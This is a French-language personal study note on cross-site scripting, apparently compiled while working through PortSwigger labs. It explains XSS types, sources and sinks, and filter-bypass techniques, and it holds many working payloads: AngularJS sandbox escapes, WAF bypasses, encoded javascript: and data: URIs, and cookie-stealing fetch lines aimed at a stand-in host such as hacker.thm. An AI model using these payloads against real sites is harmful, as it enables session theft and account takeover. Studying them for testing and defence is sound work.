[https://owasp.org/www-community/attacks/xss/](https://owasp.org/www-community/attacks/xss/ "https://owasp.org/www-community/attacks/xss/")  
XSS hunter  
[https://github.com/wisec/domxsswiki/wiki](https://github.com/wisec/domxsswiki/wiki "https://github.com/wisec/domxsswiki/wiki")

## Définition

###### Qu'est ce qu'une injection XSS :  

Comment j'ai compris le fonctionnement (important) :  
1. **Persistantes** :
	- Les injections XSS persistantes restent dans le contenu du site, même après la soumission initiale.
	- Elles sont stockées dans des endroits tels que les commentaires, les profils, les champs de publication, etc.
	- Lorsqu'une page est chargée, le code malveillant inclus dans le contenu est exécuté dans les navigateurs des utilisateurs.
2. **Propagation** :
    - Pour qu'une injection XSS se propage, le code malveillant doit être inclus dans le contenu visible par d'autres utilisateurs.
    - Les pages publiques, les forums, les sections de commentaires et les champs partagés sont des endroits propices à la propagation.
    - Le code malveillant est interprété et exécuté dans les navigateurs de tous les utilisateurs qui visitent la page.


3. **Exemples** :
    - Un commentaire malveillant contenant une injection XSS peut s'afficher sur une page de discussion, affectant les visiteurs suivants.
    - L'injection XSS dans un profil peut être vue par d'autres utilisateurs visitant ce profil.
    - Les injections ciblées peuvent exploiter des fonctions spécifiques du site, comme le changement d'adresse e-mail, et causer des effets malveillants.


4. **Effets** :
    - Les utilisateurs exposés au code malveillant peuvent être incités à effectuer des actions non intentionnelles.
    - Les attaques peuvent aller de l'affichage d'alertes à des manipulations de données, des réinitialisations de mot de passe, etc.


5. **Prévention** :
    - Les développeurs doivent valider, filtrer et échapper correctement les entrées utilisateur.
    - Les sites doivent mettre en œuvre des politiques de sécurité, des pare-feux applicatifs et des audits de code.
    - Les utilisateurs doivent être conscients des risques de sécurité en ligne et éviter de cliquer sur des liens suspects.

- En gros, si je suis sur un réseau social, j'ai identifié une xss possible dans ma biographie, j'injecte du javascript qui renvoie les cookie par exemple `<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>`. Donc la biographie contiendra du js qui renverra directement les cookie de la sessions, de celui qui voit ma bio, à l'adresse spécifié. En fait l'injection est stocké avec le texte que j'ai mis a coté (pas obligé qu'il y ai du texte, c'est juste pour illustrer) donc y'a pas de truc bizarre en mode je m'adapte au code source, l'injection est vraiment juste posé et retranscrite à ceux qui accederont a la page.

###### Ce que peut faire une attaques XSS :

- Se faire passer pour une victime
- Faire n'importe quelles actions qu'une victime peut faire
- Voir n'importe quelles données que l'user est capable de voir
- Capturer les logins d'un user
- Injecter des trojans

#### Reflected XSS :

**Description :**

- Dans le cas d'une attaque de type reflected XSS, l'injection de script malveillant se fait généralement à travers les paramètres de l'URL ou les données envoyées par l'utilisateur.
- L'attaque XSS réfléchie exploite le fait que le site web renvoie le script malveillant directement dans la réponse HTTP, ce qui permet au navigateur de l'utilisateur de l'exécuter.
- Les attaques XSS réfléchies visent souvent à tromper l'utilisateur en cliquant sur un lien contenant le script malveillant, en envoyant des emails piégés, etc.

#### Stored XSS :

**Description :**

- Dans une attaque de type stored XSS, le script malveillant est injecté dans une application web et stocké sur le serveur. Il peut être ensuite renvoyé aux utilisateurs lorsqu'ils accèdent à une page affectée.
- Les attaques stored XSS peuvent résulter d'une mauvaise validation ou d'un filtrage inadéquat des données entrantes par l'application.
- Les attaques stored XSS sont particulièrement dangereuses car elles peuvent affecter plusieurs utilisateurs lorsqu'ils visitent la page compromise.

#### DOM based XSS :  
[https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/dom-xss](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/dom-xss "https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/dom-xss")

**Description :**

- Les attaques DOM-based XSS se produisent au niveau du navigateur, lorsque le script malveillant modifie directement le DOM (Document Object Model) de la page web.
- Contrairement aux autres types d'attaques XSS, le payload ne passe pas par le serveur, mais est plutôt manipulé par le navigateur lui-même.
- L'attaquant exploite souvent des vulnérabilités dans le JavaScript de la page pour injecter le script malveillant.

WAF Bypass

#### Client-side template injection :  
**Description :**

- Une client-side template injection survient quand l'app utilise un framework template comme AngularJS par exemple et que l'input de l'user est  dynamiquement incorporée dans la page.



#### Cheat Sheet :

**Source** : Endroit où on injecte le payload. Une liste d'exemple pour comprendre :

- document.URL
- document.documentURI
- document.URLUnencoded
- document.baseURI
- location
- document.cookie
- document.referrer
- window.name
- history.pushState
- history.replaceState
- localStorage
- sessionStorage
- IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB)
- Database


**Sink** : Endroit affecté par le payload. C'est là où les données sensibles seront affichées. Une liste d'exemple :

[https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/dom-xss#examples](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/dom-xss#examples "https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/dom-xss#examples")

- Pouvant mener à une DOM-based XSS :
    - document.write()
    - document.writeln()
    - document.domain
    - element.innerHTML
    - element.outerHTML
    - element.insertAdjacentHTML
    - element.oneven
    - Pour les fonctions JQuery :
    - add()
    - after()
    - append()
    - animate()
    - insertAfter()
    - insertBefore()
    - before()
    - html()
    - prepend()
    - replaceAll()
    - replaceWith()
    - wrap()
    - wrapInner()
    - wrapAll()
    - has()
    - constructor()
    - init()
    - index()
    - jQuery.parseHTML()
    - $.parseHTML()
        

[https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet "https://portswigger.net/web-security/cross-site-scripting/cheat-sheet")  

#### Trouver une injection XSS :

- Tester tout les point d'entrée possibles. Voir les sources dans la partie cheat-sheet.
- Pour les tester, on peut utiliser Burp Intruder pour foutre des nombres random dans la source. On pourra alors voir si la données est refleté dans la page ce qui pourrai nous donner une piste pour trouver une injection xss reflected.
- Comprendre le contexte dans lequel la donnée est refleté dans la page. Si c'est dans du html tag, html attribut, javascript string...
- Tester ensuite un payload adapté dans burpsuite pour plus de facilité et voir si on peut en tirer un truc interéssant. Tester évidemment avec plusieurs payload.
- Si tu trouve une injection xss dans burpsuite, teste alors dans le browser en copiant l'url qui fonctionne dans la bar du navigateur.

---

## Exploitation

###### L'app définit un élément avec notre propre input grâce à innerHTML :
- Payload : `<img src=1 onerror=alert(1)>`
- Dans les navigateurs modernes, l'insertion de balises script quand on utilise innerHTML n'est plus autorisé donc on ne peut plus faire simplement alert(1).
- Exemple concret : Imaginons qu'on ai un site qui a une fonctionnalité de recherche qui fonctionne avec innerHTML pour remplacer l'élément recherché par l'input. Ca veut donc dire qu'on controle l'input et donc la nouvelle valeur de innerHTML. Dans le code source, ça pourrai ressembler à ça :

`document.getElementById('searchMessage').innerHTML = query;`

- Donc notre payload se placera à la place de "query". Pour imager, faudrait voir ça un peu comme un parcours où le code source Javascript est un obstacle à franchir et l'objectif final c'est que l'injection soit bien interprété dans le code HTML. (imagine qu'il y ai des filtres grâce au code javascript, bah faudrai protéger le code final, qui doit s'emboiter avec le code HTML, avec des couches de protections comme de l'urlencode ou d'autre technique de bypass) Ce qui est dur, c'est pas de savoir placer du code malveillant dans du code HTML, c'est de savoir bypass les protections contre les injections XSS.
    
- Au final, **l'injection faut pas la voir comme ça** : `document.getElementById('searchMessage').innerHTML = <img src=1 onerror=alert(1)>;`car ca n'a aucun sens. C'est pas l'endroit final où sera le payload, c'est juste un endroit où on gère le contenu de l'élément. Y'a pas vraiment de façon exhaustive de voir l'injection, voit le plus de façon imagé où le payload est l'armée de base qui doit attaquer un chateau, le code javascript c'est l'armée d'en face, et le reste de notre payload dans le code HTML c'est le groupe de personnes que notre armée devait protéger. Où la difficulté réside dans le fait de bien counter l'armée adverse et ne pas avoir trop de soldat (overkill) car le payload final n'aura plus aucun sens.
    
La fonction attr() définit un attribut d'un élément avec notre input :
    
- Payload : `javascript:alert(1)`
- Là c'est pas le payload qui est interéssant, c'est surtout le fait que l'app nous laisse définir un attribut d'un élément html (backlink dans mon cas, juste un élément qui utilise un lien pour retourner en arrière).
- Fonction attr() : C'est une fonction de la dépendance JQuery qui sert à obtenir ou définir un attribut d'un élément HTML.

`$(function() {$('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));});`

- Dans cette exemple, backlink c'est l'élément HTML qui, quand on va cliquer dessus, il va nous renvoyer vers le lien href, défini par le paramètre returnPath qui se trouve dans window.location.search donc dans l'url. Donc en gros, de base quand on va sur la page, dans l'url on voit un paramètre qui vise un path. Dans mon cas c'était /.
    
- On a donc un contrôle total sur le lien qui va redirigé l'user. Mais nous on va juste faire une alerte donc on va utiliser le scheme javascript:.
    
- C'est aussi possible avec tous les attributs, pas seulement href. On a bien sûr les attribut src où on demande un url et donc on peut mettre également `javascript:alert(1)`. Mais on peut simplement utiliser un payload tel que `var *userStyle = **'color: red; " onmouseover="alert(1);'**;$("#myElement").attr("style", userStyle); *`où on s'en fout clairement du type d'attribut, il doit juste être valide pour que ce qu'on mette juste derrière soit valide aussi.
    
### AngularJS :
    
- C'est une librarie de Javascript. C'est assez courant puisqu'il ajoute pas mal de fonctionnalités.
        
	- **Choses à savoir avant de lire les vulnérabilités :** 
    
        - Dans une page, on peut utiliser `{{ ... }}` pour dire qu'on va se servir de AngularJS. On peut également utiliser ng-nom d'une directive pour ajouter des fonctionnalité de AngularJS dans la page.
        - Même si ce n'est pas recommandé, on peut définir des fonctions comme ca : `{{ function functionname('alert(1)') () }}` pour définir une fonction et l'appeler directement. Ce n'est pas recommendé pour un dev car inutile en vrai + pas sécurisé. Par contre pour un attaquant, on s'en fiche qu'il soit pas sécure quand on s'en sert donc on pourra l'utiliser
        - Un scope en AngularJS c'est ce qui fait réfèrence à tous les objets, function et propriété qui font partie de l'API AngularJS. Parmis les fonctions, on retrouve une liste qui contient par exemple `$eval`, `$on`, `$emit`. (les $ c'est juste pour dire qu'on utilise des objets de l'api, pas des objets qu'on définit nous-même).
        - Dans Javascript, quand on créer une fonction, en fait on appelle une fonction déjà existante qui s'appelle `Function()` et qui créer la notre. C'est la fonction constructor (rien à voir avec les constructeur de classe comme en C). Cette fonction donne ses propriétés à toute les fonctions. Parmis ces propriété, on a .constructor qui fait directement référence à Function(). Ca veut donc dire qu'on peut créer une fonction dynamiquement (comme dans le deuxième point) et en plus en faisant référence aux constructeur de n'importe quelle fonction. En développement y'a absolument personne qui fait ça hein mais dans le hacking si. Ca pourrait ressembler à ça : `test.constructor('console.log("hello")')`. Où test c'est une fonction random qu'on a créer pour une autre utilisation par exemple. Par contre cette ligne défini une fonction mais elle ne s'execute pas et n'est même pas référençable car on l'a pas mit dans une variable.
        - Une sandbox c'est un environnement controlé et isolé dans lequel le framework peut executer des tests de validations pour les éléments de la page. Pour ce faire, on utilise des fonctions tel que `ensuresafeobjet()` ou `ensureSafeMemberName()`. Ca restreint l'accès à des éléments comme window ou document en parsant la données, en la réécrivant en javascript et en utilisant les fonctions pour voir si le code contient des objets dangereux.

    - **Mauvaise validation de données :**
        
        - Payload : `{{$eval.constructor('alert(1)')()}}`
        - Si on voit que l'injection `{{ 1 + 1 }}` ou tout autre test fonctionne, alors l'injection est possible.
        - Bon c'est le truc basique où l'application est vraiment pourrave mais le payload est quand même vachement beau.
        - En fait, on dit qu'on va utiliser du AngularJS en spécifiant les `{{ ... }}`. $eval.constructor fait référence à `Function()`. Donc on créer une fonction qui envoie une alerte. Sauf qu'il faut qu'elle s'execute cette fonction, on fait donc () juste derrière. Donc même si y'a pas de fonction javascript qu'on peut voir dans le code source, si c'est une app AngularJS, bah y'aura toujours les fonctions $eval, $on ou autre.

    - **Interdiction des quotes dans l'input (AngularJS 1.4.4) :**
        
        - Payload : `?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1`
        - The exploit uses `toString()` to create a string without using quotes. It then gets the `String` prototype and overwrites the `charAt` function for every string. This effectively breaks the AngularJS sandbox. Next, an array is passed to the `orderBy` filter. We then set the argument for the filter by again using `toString()` to create a string and the `String` constructor property. Finally, we use the `fromCharCode` method generate our payload by converting character codes into the string `x=alert(1)`. Because the `charAt` function has been overwritten, AngularJS will allow this code where normally it would not.A revoir

- **Utilisation de la fonction eval() :**
    
    - Payload : `bonjour"+alert())//`
    - Bon de base un développeur ne devrait jamais utiliser la fonction `eval()` mais si jamais tu le trouve bah c'est génial.
    - Imaginons que l'app prend notre input pour la foutre dans la fonction `eval()` sous cette forme (pas important, comprend juste comment la vuln fonctionne elle-même) : `eval("var researchobject = " + this.responsetext);` en gros elle créer une string qui dit que researchobject = notre input.
    - Le + sert à concatener le "bonjour" avec alert(). Et ca marchera puisqu'on aura un objet javascript. Et on sait que les objets javascript peuvent contenir des fonctions. Si on aurait mit JSON.parse à la place de la fonction eval(), la vulnérabilité n'aurait pas fonctionner car en json, les fonctions ne sont pas accepté en tant qu'objet. [https://youtu.be/bg_xH4Dp-6E](https://youtu.be/bg_xH4Dp-6E "https://youtu.be/bg_xH4Dp-6E"). La bonne façon de transformer l'input aurait été de la mettre en JSON comme ca `let comments = JSON.parse(this.responseText);`

- **Utilisation de la fonction replace() :**
    
    - Payload : `<><iframe src="javascript:alert(1)">`
    - La fonction replace remplace par défaut que la première occurences. Là, la fonction sert à remplacer les "<>".
    - Donc on a juste à rajouter un <> avant pour que celui ci soit remplacé et pour que ceux qui se trouvent derrière soit safe. Par contre les vulnérabilités liées à cette fonction ça va juste être du bypass, là en l'occurence c'était juste les <> mais ça peut être autre chose.
- **WAF qui interdit la plupart des tags/attributs :**
    
    - Payload complet : `<iframe src="target_site/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>`
    - Si notre site nous dit qu'il interdit les tags en insérant ce payload par exemple : `<script></script>`, on va tester avec tout les tags possible avec burpsuite.
    - Pour se faire, on va, avec la requête, aller dans burp intruder, mettre en input <1> et mettre ajouter le 1 en payload. Va sur la cheatsheet de portswigger et copy tous les tags. Met les dans le payload, lance l'attaque et regarde si y'en a qui fonctionne. Dans notre exemple, c'est body qui marche.
    - Fais la même chose avec les attributs. Dans la requête tu mets `<body%20=1>` et tu ajoutes l'endroit du payload avant le =. On va donc faire la même chose mais avec les attributs de la cheat sheet portswigger. Si y'en a qui fonctionne, on va pouvoir l'utiliser en le combinant avec le tag. Dans notre cas l'attribut qui marche c'est onresize donc ça va être un peu chiant parce qu'on doit modifier la taille de la page pour que l'event se déclenche. En injectant, le payload simplement dans l'input, ca peut pas vraiment marcher.
    - On va donc utiliser iframe avec un event onload qui change la taille de la page. iframe c'est un tag qui affiche du texte qui lui va pointer vers un lien. (comme les liens evernote). Donc on peut ajouter un attribut onload qui change la taille de la page, et avec le payload de base qu'on a mit dans la requête (), l'event va se trigger ce qui va executer notre code javascript. En fait là c'est carrément tous l'exploit qui fonctionne réellement, c'est pas juste un payload. Si on le met dans un email par exemple, bah ça va vraiment fonctionner.

- **WAF interdit tout les tags sauf les custom :**
    
    - Payload : `<xss-inject id=pd tabindex=0 onfocus=alert(document.cookie)>#pd`
    - Le site n'accepte aucun tag donc on va en custom un. tabindex c'est un attribut HTML qui détermine l'ordre des onfocus. 0 = le tout premier élément sélectionné, ensuite c'est 1,2 ... Le -1 c'est ceux qui n'auront jamais le focus. Donc quand notre élément aura le focus, il lancera l'alerte.
    - Donc là quand on vient direct sur le lien avec l'injection, l'alerte se lancera.
    - Précision : #pd c'est pas overkill. En fait quand on arrive sur la page, on va directement faire une action qui va pointer vers l'élément pd. Si on aurait pas mit #pd, aucune action sur pd aurait été faite donc pas d'alerte. Ca marcherai quand même mais faudrai soit revenir sur la page, soit faire une action qui inclut pd. Cette attaque a juste besoin d'être transmise dans un lien comme ca : [[https://0aa700050490313480d87239004500e2.web-security-academy.net/?search=&lt;xss+id%3Dx+onfocus%3Dalert(document.cookie)tabindex=1&gt;#x](https://0aa700050490313480d87239004500e2.web-security-academy.net/?search=&lt;xss+id%3Dx+onfocus%3Dalert(document.cookie)tabindex=1&gt;#x "https://0aa700050490313480d87239004500e2.web-security-academy.net/?search=&lt;xss+id%3Dx+onfocus%3Dalert(document.cookie)tabindex=1&gt;#x")] ([https://0aa700050490313480d87239004500e2.web-security-academy.net/?search=<xss+id%3Dx+onfocus%3Dalert(document.cookie) tabindex=1>#x](https://0aa700050490313480d87239004500e2.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x "https://0aa700050490313480d87239004500e2.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x")) et quand la cible y va, elle a l'alerte. C'est pas comme la vuln précédente où on devait mettre le lien dans un tag iframe ce qui impliquer que ca ne pouvait pas être transmit partout.

- **On peut utiliser le tag animate mais sans href :**
    
    - Payload : `<svg><a><animate attributeName=href values=javascript:alert() /><text x=20 y=20>Clickme</text></a>`
    - C'est pas compliqué à comprendre, c'est pour un lien hypertext c'est pour ça qu'il englobe tout et le tag animate doit obligatoirement être entre des tags svg car il en fait partie. On peut pas mettre d'attribut href mais le tag animate permet de bypass ça en créant un attribut avec attributeName qui va pointer vers values.
    - Maintenant on créer le truc sur lequel on va cliquer avec text.

- **L'url est passé dans un tag link canonical :**
    
    - Payload : `'accesskey='x'onclick='alert(document.domain)`
    - Un tag link défini comme canonique c'est un tag qui va se distinguer des autres tag identiques. Il est beaucoup utilisé par les moteurs de recherche dans le cas où plusieurs page sont identiques. accesskey c'est un attribut qui défini une touche de raccourci pour déclencher l'event.
    - Si notre url est passé en valeur href d'un tag link rel=canonical, on peut l'exploiter sans avoir besoin d'utiliser des <> (dans le cas où c'est bloqué). Notre input est directement dans un tag donc on peut ajouter des attributs. Et donc on s'en sert pour notre payload. Ce qui est cool c'est que peu importe où on est sur la page, quand on clique sur x, on a l'alerte. (je crois que c'est pas vraiment x c'est genre alt+x, alt shift x etc...)
- **Notre input est passée dans une fonction fetch (beaucoup plus de truc à dire, la vuln est trop belle) :**
    
    - Payload : `&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'`
    - La y'a vraiment beaucoup de truc à dire mais c'est un ensemble de choses assez simple. On va y aller point par point.
    - Déjà, x=x=>{ ... } c'est simple. De base, la syntaxe connue c'est x = (x) => {...} où x2 est l'argument. En gros x1 (le premier x) c'est la variable qui va contenir la fonction. On a le droit d'écrire x2 comme ca parce qu'on NE PREND PAS D'ARGUMENT. x2 c'est pas un argument c'est juste pour la syntaxe. On pourrait (plus connue d'ailleurs) mettre () à la place. Et { ... } bah c'est le code de la fonction. Dans notre cas, le waf va bloquer toute lea parenthese donc on est obligé de mettre x2.
    - `throw/**/onerror=alert,1337` c'est plus chiant (mais beau). On sait que throw va renvoyer 1337 (voir dans les notes javascript pourquoi) mais onerror va quand même devenir la fonction alert. On ne met pas de parenthèse car c'est simplement pour l'assigner et non pas pour l'appeler. Quand on va lancer throw, on va donc générer une exception (une erreur) et donc onerror va proc car une erreur est détecté dans son élément. Throw va créer son objet d'erreur avec comme contenu 1337 mais il faut bien qu'il l'envoie quelque part. Alert va donc s'en charger et il va l'afficher dans l'alerte (en fait il va afficher uncaughted 1337 car c'est ce que tient exactement throw, c'est comme ca). Le `/**/` c'est juste que notre payload va être envoyé dans l'url donc pas d'espace. On bypass donc ce truc avec des comments.
    - toString=x c'est simple aussi. x c'est une fonction et en javascript, on peut remplacer une fonction par une autre. On remplace donc la fonction toString par x donc quand on appelera toString, on va en fait appeler la fonction x. C'est très utile pour le point suivant.
    - window+' ' c'est ce qui va enclencher la fonction x. En fait, on essaye de concatener window (un élément de la page qui n'est pas une chaine de caractère) avec une chaine de caractère vide. Javascript va donc vouloir transformer window en string. Il fait donc appele à la fonction toString (qui de base transforme un élément en string) qui fait maintenant référence à la fonction x. On aura donc l'alerte qui va pop  à ce moment.
    - Les virgules qui séparent les éléments c'est plus complexe en fait ca va expliquer la vraie vulnérabilité. En javascript, quand on invoque une fonction avec plus d'arguments qu'elle n'en prend à la base, c'est valide mais ils ne seront juste pas utilisé dans la fonction. On peut également faire un truc marrant qui est assigner à une variable une (nouvelle) valeur. Imaginons la fonction Func(a, b). Si on a une variable myvar = 1, et qu'on change la valeur carrément dans un arguments comme ça : Func(1, 2, 3, myvar=5) la nouvelle valeur de myvar prendra vraiment effet. Ca veut donc dire que ce qu'on fait dans les arguments en plus d'une fonction, ça a un réel impact dans le code. J'ai oublié mais les virgules c'est juste pour séparer tout les arguments hein.
    - Le code qu'on essaie de bypass c'est ça : [Back to Blog](# "#") donc notre input c'est le 5 car c'est ce qu'il y a dans l'url. L'app va juste chercher un numéro dans notre input mais nous on va foutre notre payload derrière donc on va l'attirer en mettant & pour qu'il continue de lire notre input. Ensuite on referme le deuxième argument de la fonction fetch avec '} et on met une virgule pour mettre nos nouveaux arguments. Puis on réouvre avec {x:' pour que l'injection soit valide.
    - Au final, cette injection exploite pas mal de fonctionnalité ultra sympa à connaitre en étant eux-même dans une vulnérabilité sympa avec une fonction pas mal utilisée.

- **Injection XSS sans parenthèse et semi-colonnes :**
    
    - [https://portswigger.net/research/xss-without-parentheses-and-semi-colons](https://portswigger.net/research/xss-without-parentheses-and-semi-colons "https://portswigger.net/research/xss-without-parentheses-and-semi-colons") Je vais reprendre ce blog mais avec mes mots.
    - Au début il parle d'une injection `onerror=alert;throw 1337` assez cool. A chaque fois que throw créer une exception, onerror va la chopper et en faire une alerte. Seulement, si notre WAF interdit les semi-colonnes bah c'est inutile.
    - On a donc une autre syntaxe `{onerror=alert}throw 1337` qui fait exactement la même chose.
    - Il nous montre maintenant `throw onerror=alert,'some string',123,'haha'` qui est une autre façon de faire une alerte. On va en fait assigner alert à onerror directement dans throw. Ensuite, on sait que le dernier argument de throw sera envoyé à alert.

![03b498b7f41b-article-onerror.png](file:///home/wpkaliuser/.config/joplin-desktop/resources/0a4ae636ff05fb535d11663977098a12.png?t=1704547535237)

- Ensuite il nous donne une injection qui fonctionne que dans chrome. `{onerror=eval}throw'=alert\x281337\x29'` c'est simple à comprendre, `throw` va renvoyé `uncaught = alert(1337)`. Le uncaught c'est parce que les throw renvoie toujours ça. `eval()` va donc s'en servir pour lancer l'alerte.
    
- Cependant, il nous dit que dans firefox, il nous renvoie uncaught expression au lieu de uncaught donc problème de syntaxe. On va s'inspirer de la function Error() pour notre dernier payload. Error() créer un objet error qui a certaine propriété ([http://portswigger-labs.net/hackability/inspector/?input=new Error('blah')](http://portswigger-labs.net/hackability/inspector/?input=new%20Error(%27blah%27) "http://portswigger-labs.net/hackability/inspector/?input=new%20Error(%27blah%27)")) . On va donc créer notre propre objet error (nom choisit comme ca mais on s'en fout) avec seulement les propriétés qui ont été essentielles pour le bon fonctionnement d'un objet de la fonction error(). On va enfin utiliser l'une de ses propriété, et pas n'importe laquelle, pour mettre notre alert dedans. On aura au final `{onerror=eval}throw{lineNumber:1,columnNumber:1,fileName:1,message:'alert\x281\x29'}`. Eval va seulement avoir besoin du message car il prend non seulement que les trucs interéssant mais aussi les chaines de caractère en général. On va donc mettre notre alert dans la propriété message. Eval va donc exécuter l'alerte.
    
- **Tips pour les encodages (général) :**
    
    - Quand tu encode un payload, assure toi que ce sera le tout premier encodage qui sera fait. Ce que je veux dire c'est qu'il ne faut pas modifier une requête dejà url encodé pour la mettre sous html encode. Ca ne marchera pas. Au lieu de ca, il faut que ton payload soit dejà html encodé quand il est envoyé dans la requete.

- **Notre input est dans une JS template literals :**
    
    - Payload : `' ${alert(document.domain)}//`
    - Une JS template literal c'est  une chaine de caractère dans laquelle on peut mettre des expressions javascript. Elle est spécifié en utilisant backticks (\`\`). Quand on veut mettre une expression javascript comme une variable par exemple, on la met dans `${ ... }`. Donc quand on est dans un truc comme ca, c'est la porte ouverte à toute les fenetres. On a meme pas besoin d'échapper la JS template literal `

`fetch('http://{URL_OR_IP}?cookie=' + btoa(document.cookie) );`

`123" onmouseover="alert(document.cookie);` : on ajoute un event en plus (un attribut) à l'élément html (une input en l'occurence) donc quand on a la souris dessus, on a l'alerte. (précision : le " avant alert c'est parce que juste après y'a un guillement car de base c'est entre deux guillemets qu'on fait tous ca. et étant donné que la valeur d'un attribut doit être entre "")

`javascript:alert(document.cookie);` : Imaginons que je dois créer un lien avec une input, si je met l'injection a la place, dans le code ca ressemblera a : `href="javascript:alert(document.cookie);"`

"javascript:" n'est pas le seul scheme d'url, c'est comme http:, tel: ou encore mailto: sauf que là, a la place de mettre un lien http bah on met du code javascript.

---

**Javascript hoisting** : A savoir : les fonctions et variables peuvent être déclaré APRES leur utilisation pas comme en c où on doit tous déclarer avant. Explication : toutes les variables et fonctions sont élevées en haut du script.

XSS js hoisting (note : les payload sont encodé en urlencode)

![Screenshot_2023-08-26_17_26_28.png](file:///home/wpkaliuser/.config/joplin-desktop/resources/6578743c802f78c120aef60c56a700b3.png?t=1704547535215)![Screenshot_2023-08-26_17_28_49.png](file:///home/wpkaliuser/.config/joplin-desktop/resources/a27582ba7f8b85e2ae4bb22151cd363b.png?t=1704547535227)

Par contre, ca ne fonctionne pas avec les classes.

---

`" autofocus onfocus=alert(document.domain) x="` : autofocus onfocus est un attribut qui vise une action et cette action sera la première faite quand on charge la page. x=" c'est juste pour completer avec le guillement de base.

XSS

: déclenche l'alerte dès qu'on clique n'importe où sur la page. Ca marche également avec onmouseover.

[a](# "#") : encoder le j de javascript en html encode sert a contourner le WAF.

`DaTa:text/html,alert(1)` : Cette injections xss utilise le scheme data avec deux lettre en maj pour potentiellement contourné le waf (peu probable car il n'est pas non plus débile). on spécifie que ce qui va suivre devra etre du code html. on met notre payload entre deux balises de js. Cette injections peut être envoyé dans un url ou tout autre source avec une sink qui gere des url comme des href ou des src. (pas img)

Autres injections grace au scheme javascript et data : `javascript:alert(1)`

```
javascript:alert(1)
JavaSCript:alert(1)
javascript:%61%6c%65%72%74%28%31%29 //URL encode
javascript&colon;alert(1)
javascript&#x003A;alert(1)
javascript&#58;alert(1)
&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3aalert(1)
java        //Note the new line
script:alert(1)
data:text/html,<script>alert(1)</script>
DaTa:text/html,<script>alert(1)</script>

data:text/html;charset=iso-8859-7,%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e

data:text/html;charset=UTF-8,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=
data:text/html;charset=thing;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg

data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAwIiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==
```

Exemple d'endroit où on peut l'injecter :

```
<a href="javascript:alert(1)">
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">
<form action="javascript:alert(1)"><button>send</button></form>

<form id=x></form><button form="x" formaction="javascript:alert(1)">send</button>

<object data=javascript:alert(3)>
<iframe src=javascript:alert(2)>
<embed src=javascript:alert(1)>

<object data="data:text/html,<script>alert(5)</script>">

<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+" type="image/svg+xml" AllowScriptAccess="always"></embed>

<embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="></embed>

<iframe src="data:text/html,<script>alert(5)</script>"></iframe>

//Special cases
<object data="//hacker.site/xss.swf"> .//https://github.com/evilcos/xss.swf

<embed code="//hacker.site/xss.swf" allowscriptaccess=always> //https://github.com/evilcos/xss.swf

<iframe srcdoc="<svg onload=alert(4);>">
```

---

`<input type="hidden" value="y" popover id="x" onbeforetoggle=alert(1)>`: imaginons que j'ai un bouton `<button popovertarget="x">Click me</button>`. L'injection dans la valeur du hidden ressemblerai a `" popover id="x" onbeforetoggle=alert(1)>` ou un truc du genre. popover c'est un attribut qui désigne ce qui passera par dessus un élément. Là il vise l'élément x car "x" a un attribut qui correspond bien. onbeforetoggle désigne une action à faire avant le changement d'un élément. Au final, dès que le buton x est cliqué, l'input hidden est affiché au dessus mais onbeforetoggle oblige a executé une alerte avant. ca fonctionne aussi dans un élément sans le type:hidden, c'est juste parce que c'est dur d'injecter un hidden donc c'est le plus interressant.

`<input type="hidden" accesskey="X" onclick="alert(1)">`: Dans une input hidden c'est chiant pour les event car les trucs genre onmouseover ca marche pas. A la place, on peut definir un raccourci qui, quand il sera déclenché, lance le script qu'on a mit. Le onclick est obligatoire car c'est quand on CLIQUE SUR X que l'alerte se lance. Le payload va ressemblai a un truc du genre `" accesskey="x" onclick="alert(1)" x="`

